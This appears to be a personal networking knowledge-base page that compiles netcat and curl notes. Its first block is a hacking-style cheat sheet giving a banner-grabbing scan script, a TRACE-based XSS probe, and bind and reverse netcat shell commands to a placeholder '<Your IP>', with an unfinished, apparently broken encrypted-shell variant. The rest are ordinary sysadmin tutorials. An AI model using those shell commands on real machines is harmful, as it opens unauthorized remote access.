---
type: reference
title: Adding the -r flag will make the source and or destination port ranges random instead of letting the system assign which ports to use.
description: Section 2 of the legacy NetworkKB notes.
tags: [kb-network]
generated: { by: "human:izaqyos", at: "2025-10-03T11:21:05Z" }
status: stable
capture_type: source
legacy_source: "Network/NetworkKB#2"
---

# Adding the -r flag will make the source and or destination port ranges random instead of letting the system assign which ports to use.

[↑ NetworkKB](/Network/kb-network/README.md)

```text
Banner grabbing

Port scanning is fun but we can't do a lot with this until we properly fingerprinted the programs behind the ports, this can be done with a technique called banner grabbing.
Now that the scripts are getting bigger and bigger I won't be displaying one liners anymore, you will have to write the files to filenames and execute them.
Here is a script which will port scan and banner grab automatically with netcat.
It will check for the SSH and MySQL version by connecting and saving the results and it will see if the HTTP server is vulnerable to the TRACE method, look in the dumpfile /tmp/bannergrab and look for "<script>alert(123)</script>" if you can find that back you got yourself a vulnerable server.

#!/bin/sh
range="192.168.1.";
# You can change this to a port range $(seq 20 25) is port 20-25
ports="22 80 3306";

http_header="HEAD / HTTP/0.1\n\n";

for host in $(seq 137 139); do
	for port in $ports; do
		echo "[+] Testing "$range$host":"$port;
		result=$(nc -zv $range$host $port 2>&1 | grep succeeded);
		if [ -n "$result" ]; then
			echo "\n"$range$host":"$port"\n" >> "/tmp/bannergrab"
			if [ "$port" -eq "22" ]; then
				echo "Found open port "$range$host":"$port" Here might be some SSH server, it echoes the SSH version to you on connecting when lucky.";
				nc -v $range$host $port -w 1 >> "/tmp/bannergrab";
			fi;
			if [ "$port" -eq "80" ]; then
				echo "Found open port "$range$host":"$port" Trying to fingerprint with HEAD and see if the server is vulnerable to TRACE XSSing";
				echo $http_header | nc -v -w 2 $range$host $port >> "/tmp/bannergrab"
				echo "TRACE / HTTP/1.1\nHost: $range$host\nuser-agent: <script>alert(123)</script>\n\n" | nc -v -w 2 $range$host $port >> "/tmp/bannergrab"
			fi;
			if [ "$port" -eq "3306"]; then
				echo "Found open port "$range$host":"$port" Possible MySQL installation found, saving the banner for later inspection, the MySQL version can be found in this.";
				nc -v $range$host $port -w 1 >> "/tmp/bannergrab";
			fi;
		fi;
	done
done

Basic netcat backdoor shells

There is a flag "-e" in netcat, with this you can let netcat automatically listen with the specified program, it has been removed because of the security issues related to this, there has been a public exploit exploiting a buffer overflow in this since 2004 on windows and there has not been a patch.

# For *nix systems you can use this:
$ nc -l -e /bin/sh localhost 1337
# And for Windows systems you can use this:
$ nc -l -e cmd.exe cmd.exe 1337

Just another reminder, you might need the -p flag before the port, in the latest versions this is not required but the later versions also don't support the -e flag.
Once you executed this command on the computer you can simply netcat in it and you will have your shell.
You may wonder why a buffer overflow is a problem in a function which is mainly for creating a backdoor, it's because there are mail server scripts and things like that which depend on netcat.
You can also just give it another program for example this would open a port and echo anything back.

$ nc -l -e /bin/cat localhost 1337

Here you don't have supposedly a backdoor running but with the buffer overflow you could exploit it.
Anyway, let's reverse things, listening shells are way too detectable and when there is some basic port forwarding you can't get in already.
This way you will make yourself listen and netcat will connect to you and give you a shell.

# You do:
$ nc -lv 1337
# And on the machine you want to backdoor you do:
$ nc -e /bin/sh <Your IP> 1337

Be sure the remote computer can reach you over that port, when you have a home user setup you probably just have to go inside your router and port forward the port to your computer to make it work.
Better netcat backdoor shells

Since the -e flag has been removed in most versions we have to hack our way around it.
Here is a basic exmple of how to do so:

mkfifo /tmp/pipe;
sh /tmp/pipe | nc -l 1337 > /tmp/pipe

Just connect to it and you got a shell.
Here is the reversed version:

mkfifo /tmp/pipe
sh /tmp/pipe | nc localhost 1338 > /tmp/pipe

Unencrypted shell streams are very easy to sniff, we should encrypt them.

!under consruction! - blowfish encryption
#!/bin/sh
# This script is for the connecting client.

password="secret";

echo $1 > cache_cmd;
openssl enc -bf -pass pass:passwd -in cache_cmd | nc localhost 1337

#!/bin/sh
# This script is for the listening server.

password="secret";

openssl enc -bf -d -in $1 -pass pass:$password -out cache;
cat cache;

#tiny notes
openssl enc -bf -d -in pipe -pass pass:passwd | nc -l 1337 > pipe

openssl enc -bf -pass pass:passwd -in cache_cmd | nc localhost 1337
!under construction!

This cheat sheet is still under construction, I released it so friends can give feedback, if you have feedback or questions or you see errors please let me know through a comment or contact me if you know how (you can always look in the ackack IRC storm.psych0tik.net/6697 #ackack).
```

### 9.4.2 netcat uses

```text
I'm using two systems in this article:

    server1.example.com: IP address 192.168.0.100
    server2.example.com: IP address 192.168.0.101

netcat should already be installed on your system - you can check with

which nc

To learn more about netcat, take a look at its man page:

man nc

 
2 Copying A File From One System To The Other

Let's say we want to copy the file ISPConfig-2.2.27.tar.gz from server1 to server2. To do this, run

server2:

nc -lp 1234 > ISPConfig-2.2.27.tar.gz

on server2 (1234 is some unused port - you can replace it with another value if you like). server2 will then wait for the file ISPConfig-2.2.27.tar.gz on port 1234.

On server1, run

server1:

nc -w 1 server2.example.com 1234 < ISPConfig-2.2.27.tar.gz

to start the file transfer.

 
3 Cloning Hard Drives & Partitions

You can use netcat even to clone hard drives/partitions over the network. In this example, I want to clone /dev/sda from server1 to server2. Of course, the to-be-cloned partitions must be unmounted on the target system, so if you want to clone the system partition, you must boot the target system (server2) from a rescue system or Live-CD such as Knoppix. Please keep in mind that the target system's IP address might change under the live system (you can find out by running

ifconfig

). server2's IP address in this example is 192.168.0.12 instead of 192.168.0.101.

On server2, run

server2:

nc -l -p 1234 | dd of=/dev/sda

Afterwards, on server1, run

server1:

dd if=/dev/sda | nc 192.168.0.12 1234

to start the cloning process. This can take some time, depending on the size of the hard drive or partitions.

 
4 Port Scanning

On server1, you can scan for open ports on server2 as follows:

server1:

nc -v -w 1 server2.example.com -z 1-1000

(1-1000 means: scan ports from port number 1 to port number 1000.)

You can also scan ports on the local system:

nc -v -w 1 localhost -z 1-1000

 
5 Serving Web Pages

You can even use netcat to act as a web server:

while true; do nc -l -p 80 -q 1 < somepage.html; done

would serve the page somepage.html until you close the terminal window.

 
6 Spoofing HTTP Headers

You can use netcat to request web pages:

nc ispconfig.org 80

You can then type in headers as follows:

GET / HTTP/1.1
Host: ispconfig.org
Referrer: mypage.com
User-Agent: my-browser

As you see, this allows you to make up your own referrers and browser (User-Agent). After you've typed in your headers, press ENTER twice, and the requested page will appear (including the headers sent back by the remote server):

server2:~# nc exampple.com 80
GET / HTTP/1.1
Host: example.com
Referrer: mypage.com
User-Agent: my-browser

HTTP/1.1 200 OK
Date: Fri, 28 Nov 2008 14:11:49 GMT
Server: Apache/2.2.3 (Debian) mod_ssl/2.2.3 OpenSSL/0.9.8c
Last-Modified: Wed, 26 Nov 2008 19:34:17 GMT
ETag: "228c707-21b1-b6b7e040"
Accept-Ranges: bytes
Content-Length: 8625
Content-Type: text/html

[...]

 
7 Chatting

You can even use netcat to chat from one system to the other on the command line.

Type

server2:

nc -lp 1234

on server2. server2 will then wait until server1 connects on port 1234.

On server1, run

server1:

nc server2.example.com 1234

Now you can type in messages on either system and press ENTER, and they will appear on the other system. To close the chat, press CTRL+C on either system.
```

### 9.4.3 netcat check if port is open

```text
# nc -z localhost 8000
Connection to localhost 8000 port [tcp/irdmi] succeeded!

double check w/ netstat
# netstat -a | grep -i rdm
tcp        0      0 *:irdmi                     *:*                         LISTEN      
```

### 9.4.4 8 Practical Linux Netcat NC Command Examples

#### 9.4.4.1 Netcat in a Server-Client Architecture

```text
The netcat utility can be run in the server mode on a specified port listening for incoming connections.

$ nc -l 2389
Also, it can be used in client mode trying to connect on the port(2389) just opened

$ nc localhost 2389
Now, if we write some text at the client side, it reaches the server side. Here is the proof :

$ nc localhost 2389
HI, server
On the terminal where server is running :


 
$ nc -l 2389
HI, server
So we see that netcat utility can be used in the client server socket communication.
```

#### 9.4.4.2 Use Netcat to Transfer Files

```text
The netcat utility can also be used to transfer files. At the client side, suppose we have a file named ‘testfile’ containing :

$ cat testfile
hello test
and at the server side we have an empty file ‘test’

Now, we run the server as :

$ nc -l 2389 > test
and run the client as :

cat testfile | nc localhost 2389
Now, when we see the ‘test’ file at the server end, we see :

$ cat test
hello test
So we see that the file data was transfered from client to server.
```

#### 9.4.4.3 Netcat Supports Timeouts

```text
There are cases when we do not want a connection to remain open forever. In that case, through ‘-w’ switch we can specify the timeout in a connection. So after the seconds specified along with -w flag, the connection between the client and server is terminated.

Server :

nc -l 2389
Client :

$ nc -w 10 localhost 2389
The connection above would be terminated after 10 seconds.

NOTE : Do not use the -w flag with -l flag at the server side as in that case -w flag causes no effect and hence the connection remains open forever.
```

#### 9.4.4.4 Netcat Supports IPV6 Connectivity

```text
The flag -4 or -6 specifies that netcat utility should use which type of addresses. -4 forces nc to use IPV4 address while -6 forces nc to use IPV6 address.

Server :

$ nc -4 -l 2389
Client :

$ nc -4 localhost 2389
Now, if we run the netstat command, we see :

$ netstat | grep 2389
tcp        0      0 localhost:2389          localhost:50851         ESTABLISHED
tcp        0      0 localhost:50851         localhost:2389          ESTABLISHED
The first field in the above output would contain a postfix ‘6’ in case the IPV6 addresses are being used. Since in this case it is not, so a connection between server and client is established using IPV4 addresses.

Now, If we force nc to use IPV6 addresses

Server :

$ nc -6 -l 2389
Client :

$ nc -6 localhost 2389
Now, if we run the netstat command, we see :

$ netstat | grep 2389
tcp6       0      0 localhost:2389          localhost:33234         ESTABLISHED
tcp6       0      0 localhost:33234         localhost:2389          ESTABLISHED
So now a postfix ‘6’ with ‘tcp’ shows that nc is now using IPV6 addresses.
```

#### 9.4.4.5 Disable Reading from STDIN in Netcat

```text
This functionality can be achieved by using the flag -d. In the following example, we used this flag at the client side.

Server :

$ nc -l 2389
Client :

$ nc -d localhost 2389
Hi
The text ‘Hi’ will not be sent to the server end as using -d option the read from stdin has been disabled.
```

#### 9.4.4.6 Force Netcat Server to Stay Up

```text
If the netcat client is connected to the server and then after sometime the client is disconnected then normally netcat server also terminates.

Server :

$ nc -l 2389
Client :

$ nc localhost 2389
^C
Server :

$ nc -l 2389
$
So, in the above example we see that as soon as the client got disconnected the server was also terminated.

This behavior can be controlled by using the -k flag at the server side to force the server to stay up even after the client has disconnected.

Server :

$ nc -k -l 2389
Client :

$ nc localhost 2389
^C
Server :

$ nc -k -l 2389
So we see that by using the -k option the server remains up even if the client got disconnected.
```

#### 9.4.4.7 Configure Netcat Client to Stay Up after EOF

```text
Netcat client can be configured to stay up after EOF is received. In a normal scenario, if the nc client receives an EOF character then it terminates immediately but this behavior can also be controlled if the -q flag is used. This flag expects a number which depicts number of seconds to wait before client terminates (after receiving EOF)

Client should be started like :

nc  -q 5  localhost 2389
Now if the client ever receives an EOF then it will wait for 5 seconds before terminating.
```

#### 9.4.4.8 Use Netcat with UDP Protocol

```text
By default all the sockets that nc utility creates are TCP protocols but this utility also works with UDP protocol. To enable UDP protocol the -u flag is used.

Server :

$ nc -4 -u -l 2389
Client :

$ nc -4 -u localhost 2389
Now, both the server and client are configured to use UDP protocol. This can be confirmed by the following netstat command. So we see that this connection is now using the UDP protocol.

$ netstat | grep 2389
udp        0      0 localhost:42634         localhost:2389          ESTABLISHED
```

### 9.4.5 How To Use Netcat to Establish and Test TCP and UDP Connections on a VPS

```text
Feb 19, 2014  Networking, System Tools
Introduction

Linux is known for having a great number of mature, useful command line utilities available out of the box in most distributions. Skilled system administrators can do much of their work using the built-in tools without having to install additional software.

In this guide, we will discuss how to use the netcat utility. Often referred to as a Swiss army knife of networking tools, this versatile command can assist you in monitoring, testing, and sending data across network connections.

We will be exploring this on an Ubuntu 12.04 VPS, but netcat should be available on almost any modern Linux distribution. Ubuntu ships with the BSD variant of netcat, and this is what we will be using in this guide. Other versions may operate differently or provide other options.

General Syntax
By default, netcat operates by initiating a TCP connection to a remote host.

The most basic syntax is:

netcat [options] host port
This will attempt to initiate a TCP to the defined host on the port number specified. This is basically functions similarly to the old Linux telnet command. Keep in mind that your connection is entirely unencrypted.

If you would like to send a UDP packet instead of initiating a TCP connection, you can use the -u option:

netcat -u host port
You can specify a range of ports by placing a dash between the first and last:

netcat host startport-endport
This is generally used with some additional flags.

On most systems, we can use either netcat or nc interchangeably. They are aliases for the same command.
```

#### 9.4.5.1 How To Use Netcat for Port Scanning

```text
One of the most common uses for netcat is as a port scanner.

Although netcat is probably not the most sophisticated tool for the job (nmap is a better choice in most cases), it can perform simple port scans to identify open ports easily.

We do this by specifying a range of ports to scan, as we did above, along with the -z option to perform a scan instead of attempting to initiate a connection.

For instance, we can scan all ports up to 1000 by issuing this command:

netcat -z -v domain.com 1-1000
Along with the -z option, we have also specified the -v option to tell netcat to provide more verbose information.

The output will look like this:

nc: connect to domain.com port 1 (tcp) failed: Connection refused
nc: connect to domain.com port 2 (tcp) failed: Connection refused
nc: connect to domain.com port 3 (tcp) failed: Connection refused
nc: connect to domain.com port 4 (tcp) failed: Connection refused
nc: connect to domain.com port 5 (tcp) failed: Connection refused
nc: connect to domain.com port 6 (tcp) failed: Connection refused
nc: connect to domain.com port 7 (tcp) failed: Connection refused
. . .
Connection to domain.com 22 port [tcp/ssh] succeeded!
. . .
As you can see, this provides a lot of information and will tell you for each port whether a scan was successful or not.

If you are actually using a domain name, this is the form you will have to use.

However, your scan will go much faster if you know the IP address that you need. You can then use the -n flag to specify that you do not need to resolve the IP address using DNS:

netcat -z -n -v 111.111.111.111 1-1000
The messages returned are actually sent to standard error (see our I/O redirection article for more info). We can send the standard error messages to standard out, which will allow us to filter the results easier.

We will redirect standard error to standard output using the 2>&1 bash syntax. We will then filter the results with grep:

netcat -z -n -v 111.111.111.111 1-1000 2>&1 | grep succeeded

Connection to 111.111.111.111 22 port [tcp/*] succeeded!
Here, we can see that the only port open in the range of 1-1000 on the remote computer is port 22, the traditional SSH port.
```

#### 9.4.5.2 How To Communicate through Netcat

```text
Netcat is not restricted to sending TCP and UDP packets. It also can listen on a port for connections and packets. This gives us the opportunity to connect two instances of netcat in a client-server relationship.

Which computer is the server and which is the client is only a relevant distinction during the initial configuration. After the connection is established, communication is exactly the same in both directions.

On one machine, you can tell netcat to listen to a specific port for connections. We can do this by providing the -l parameter and choosing a port:

netcat -l 4444
This will tell netcat to listen for TCP connections on port 4444. As a regular (non-root) user, you will not be able to open any ports under 1000, as a security measure.

On a second server, we can connect to the first machine on the port number we choose. We do this the same way we've been establishing connections previously:

netcat domain.com 4444
It will look as if nothing has happened. However, you can now send messages on either side of the connection and they will be seen on either end.

Type a message and press ENTER. It will appear on both the local and remote screen. This works in the opposite direction as well.

When you are finished passing messages, you can press CTRL-D to close the TCP connection.
```

#### 9.4.5.3 How To Send Files through Netcat

```text
Building off of the previous example, we can accomplish more useful tasks.

Because we are establishing a regular TCP connection, we can transmit just about any kind of information over that connection. It is not limited to chat messages that are typed in by a user. We can use this knowledge to turn netcat into a file transfer program.

Once again, we need to choose one end of the connection to listen for connections. However, instead of printing information onto the screen, as we did in the last example, we will place all of the information straight into a file:

netcat -l 4444 > received_file
On the second computer, create a simple text file by typing:

echo "Hello, this is a file" > original_file
We can now use this file as an input for the netcat connection we will establish to the listening computer. The file will be transmitted just as if we had typed it interactively:

netcat domain.com 4444 < original_file
We can see on the computer that was awaiting a connection, that we now have a new file called "received_file" with the contents of the file we typed on the other computer:

cat received_file
Hello, this is a file
As you can see, by piping things, we can easily take advantage of this connection to transfer all kinds of things.

For instance, we can transfer the contents of an entire directory by creating an unnamed tarball on-the-fly, transferring it to the remote system, and unpacking it into the remote directory.

On the receiving end, we can anticipate a file coming over that will need to be unzipped and extracted by typing:

netcat -l 4444 | tar xzvf -
The ending dash (-) means that tar will operate on standard input, which is being piped from netcat across the network when a connection is made.

On the side with the directory contents we want to transfer, we can pack them into a tarball and then send them to the remote computer through netcat:

tar -czf - * | netcat domain.com 4444
This time, the dash in the tar command means to tar and zip the contents of the current directory (as specified by the * wildcard), and write the result to standard output.

This is then written directly to the TCP connection, which is then received at the other end and decompressed into the current directory of the remote computer.

This is just one example of transferring more complex data from one computer to another. Another common idea is to use the dd command to image a disk on one side and transfer it to a remote computer. We won't be covering this here though.
```

#### 9.4.5.4 How To Use Netcat as a Simple Web Server

```text
We've been configuring netcat to listen for connections in order to communicate and transfer files. We can use this same concept to operate netcat as a very simple web server. This can be useful for testing pages that you are creating.

First, let's make a simple HTML file on one server:

nano index.html
Here is some simple HTML that you can use in your file:

<html>
        <head>
                <title>Test Page</title>
        </head>
        <body>
                <h1>Level 1 header</h1>
                <h2>Subheading</h2>
                <p>Normal text here</p>
        </body>
</html>
Save and close the file.

Without root privileges, you cannot serve this file on the default web port, port 80. We can choose port 8888 as a regular user.

If you just want to serve one page, one time to check how it renders, you can type something like this:

netcat -l 8888 < index.html
Now, in your browser, you can access the content by visiting:

http://server_IP:8888
netcat page served

This will serve the page, and then the netcat connection will close. If you attempt to refresh the page, it will be gone:

netcat page gone

We can have netcat serve the page indefinitely by wrapping the last command in an infinite loop, like this:

while true; do nc -l 8888 < index.html; done
This will allow it to continue to receive connections after the first connection closes.

We can stop the loop by typing CTRL-C on the server.

This allows you to see how a page renders in a browser, but it doesn't provide much more functionality. You should never use this for serving actual websites. There is no security and simple things like links do not even work correctly.

Conclusion
You should now have a pretty good idea as to what netcat can be used for. It is a versatile tool that can be useful to diagnose problems and verify that base-level functionality is working correctly with TCP/UDP connections.

Using netcat, you can communicate between different computers very easily for quick interactions. Netcat attempts to make network interactions transparent between computers by taking the complexity out of forming connections.

By Justin Ellingwood
		9.4.6 
```

## 9.5 curl

### 9.5.1 cheat-sheet

````text
curl cheat sheet

* XML GET
```bash
curl -H "Accept: application/xml" -H "Content-Type: application/xml" -X GET "http://hostname/resource"
```
* JSON GET
```bash
curl -i -H "Accept: application/json" -H "Content-Type: application/json" -X GET "http://hostname/resource"
```
* JSON PUT
```bash
curl -i -H 'Content-Type: application/json' -H 'Accept: application/json' -X PUT -d '{"updated_field1":"updated_value1"}' "http://hostname/resourcex"
```
* JSON POST uploading a file
```bash
curl -i -H 'Accept: application/json' -X POST -F "filename=@/file/path" -F "other_field=its_value"   "http://hostname/resource"
```
* JSON DELETE
```bash
curl -i -H 'Content-Type: application/json' -H 'Accept: application/json' -X DELETE -d '{"key1":"value1"}' "http://hostname/resource"
```
* "Debugging mode" (without actual content output):
```bash
curl -XGET -vvv http://hostname/resource > dev\null
```

### Useful arguments
* ```-k```: not check SSL certificates
* ```-L```: follow redirects
* ```-v```: get verbose output
* ```-V```: get headers at output


cURL Cheat Sheet
Curl is the swiss army knife for gathering information while troubleshooting websites. There are many ways to use curl and this guide is simply documenting the ones I often use, but can never seem to remember the specific flags.
General Usage
Test a page behind a username/password prompt:
[user@workstation01 ~]# curl --user name:password http://www.example.com
Download files from github:
[user@workstation01 ~]# curl -O https://raw.github.com/username/reponame/master/filename
Download content via curl to a specific filename:
[user@workstation01 ~]# curl -o archive.tgz https://www.example.com/file.tgz
Run a script from a remote source on server. Understand the security implications of doing this as it can be dangerous!
[user@workstation01 ~]# source <( curl -sL https://www.example.com/your_script.sh)
Website Troubleshooting
Receive output detailing the HTTP response and request headers, following all redirects, and discarding the page body:
[user@workstation01 ~]# curl -Lsvo /dev/null https://www.example.com
Test a domain hosted on the local server, bypassing DNS:
[user@workstation01 ~]# curl -sLH "host: www.example.com" localhost
Test a domain against specific IP, bypassing the need for modifying /etc/hosts:
[user@workstation01 ~]# curl -Lsvo /dev/null --resolve 'example.com:443:123.123.123.123' https://www.example.com/

or

[user@workstation01 ~]# curl -Lsvo /dev/null --header "Host: example.com" https://123.123.123.123/
Send request using a specific user-agent. Sometimes a server will have rules in place to block the default curl user-agent string. Or perhaps you need to test using a specific user-agent. You can pass specific user-agent strings by running:
[user@workstation01 ~]# curl --user-agent "USER_AGENT_STRING_HERE" www.example.com
A comprehensive listing of available user-agent strings available resides at:
http://www.useragentstring.com/pages/useragentstring.php
For example, lets say you need to test a mobile device user-agent to see if a custom redirect works:
[user@workstation01 ~]# curl -H "User-Agent: Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19" -IL http://www.example.com/about/contact-us

HTTP/1.1 301 Moved Permanently
Date: Tue, 17 Nov 2015 18:10:09 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips
Location: http://www.example.com/mobi/contact.php
Content-Type: text/html; charset=iso-8859-1
SSL/TLS Testing
Test to see if the site supports specific SSL/TLS protocols:
[user@workstation01 ~]# curl --sslv2 https://www.example.com
[user@workstation01 ~]# curl --sslv3 https://www.example.com
[user@workstation01 ~]# curl --tlsv1 https://www.example.com
[user@workstation01 ~]# curl --tlsv1.0 https://www.example.com
[user@workstation01 ~]# curl --tlsv1.1 https://www.example.com
[user@workstation01 ~]# curl --tlsv1.2 https://www.example.com
Performance Troubleshooting
Load times can be impacted by a number of things, such as the TLS handshake, DNS lookup time, redirects, transfers, upload/downloads, etc. The curl command shown below will break down the times for each accordingly:
[user@workstation01 ~]# curl -Lsvo /dev/null https://www.example.com/ -w "\nContent Type: %{content_type} \
\nHTTP Code: %{http_code} \
\nHTTP Connect:%{http_connect} \
\nNumber Connects: %{num_connects} \
\nNumber Redirects: %{num_redirects} \
\nRedirect URL: %{redirect_url} \
\nSize Download: %{size_download} \
\nSize Upload: %{size_upload} \
\nSSL Verify: %{ssl_verify_result} \
\nTime Handshake: %{time_appconnect} \
\nTime Connect: %{time_connect} \
\nName Lookup Time: %{time_namelookup} \
\nTime Pretransfer: %{time_pretransfer} \
\nTime Redirect: %{time_redirect} \
\nTime Start Transfer (TTFB): %{time_starttransfer} \
\nTime Total: %{time_total} \
\nEffective URL: %{url_effective}\n" 2>&1
The example output is below:
...
HTTP Code: 200 
HTTP Connect:000 
Number Connects: 2 
Number Redirects: 1 
Redirect URL:  
Size Download: 136112 
Size Upload: 0 
SSL Verify: 0 
Time Handshake: 0.689 
Time Connect: 0.556 
Name Lookup Time: 0.528 
Time Pretransfer: 0.689 
Time Redirect: 0.121 
Time Start Transfer (TTFB): 0.738 
Time Total: 0.962 
Effective URL: https://www.example.com/
Another example for quickly seeing performance is below. For simplicity purposes, first create a file with our curl options already in it:
[user@workstation01 ~]# vim site-performance.cfg
\n
      DNS lookup                          :  %{time_namelookup}\n
      Connect to server (TCP)             :  %{time_connect}\n
      Connect to server (HTTP/S)          :  %{time_appconnect}\n
      Time from start until transfer began:  %{time_pretransfer}\n
      Time for redirection (if any)       :  %{time_redirect}\n
      Total time before transfer started  :  %{time_starttransfer}\n
\n
             Total time                   :  %{time_total}\n
             Size of download (bytes)     :  %{size_download}\n
             Average d/l speed (bytes/s)  :  %{speed_download}\n
\n
Then run it:
[user@workstation01 ~]# curl -w "@site-performance.cfg" -o /dev/null -s https://www.example.com
      DNS lookup                          :  0.138664
      Connect to server (TCP)             :  0.171131
      Connect to server (HTTP/S)          :  0.268969
      Time from start until transfer began:  0.269021
      Time for redirection (if any)       :  0.000000
      Total time before transfer started  :  0.532772

             Total time                   :  0.628730
             Size of download (bytes)     :  162510
             Average d/l speed (bytes/s)  :  258473.000
If a web server is running a bunch of sites and has a high load, how can you narrow down which site is likely causing the high load condition on the server? One way would be to see which site takes the longest to load, as that may indicate a resource intensive site. See the example below:
[user@workstation01 ~]# for i in www.example1.com www.example2.com www.example3.com; do echo -n "$i "; (time curl -IL $i -XGET) 2>&1 | grep -E "real|HTTP"; echo; done

www.example1.com HTTP/1.1 200 OK
real	0m0.642s

www.example2.com HTTP/1.1 200 OK
real	0m2.234s

www.example3.com HTTP/1.1 200 OK
real	0m0.421s
So www.example2.com takes 2 seconds to load. What happens to the load times on that domain during increased traffic. The example below will send 25 requests to the domain:
[user@workstation01 ~]# for i in {1..25}; do (time curl -sIL http://www.example2.com -X GET &) 2>&1 | grep -E "real|HTTP" & done

HTTP/1.1 200 OK
real	0m11.297s
HTTP/1.1 200 OK
real	0m11.395s
HTTP/1.1 200 OK
real	0m11.906s
HTTP/1.1 200 OK
real	0m12.079s
...
HTTP/1.1 200 OK
real	0m11.297s
Determining why this is happening will involve investigation outside the scope of this article. Mainly around investigating ways to cache the site or otherwise optimizing it. However at least now we know which site doesn’t perform well under increased requests, and may be causing the high server load.


￼

￼
````

### 9.5.2 SAP CP

```text
[employer-specific content moved to private KB, 2026-10]
	    9.5.3
```

## 9.6 tcpdump

```text
        9.7 
```
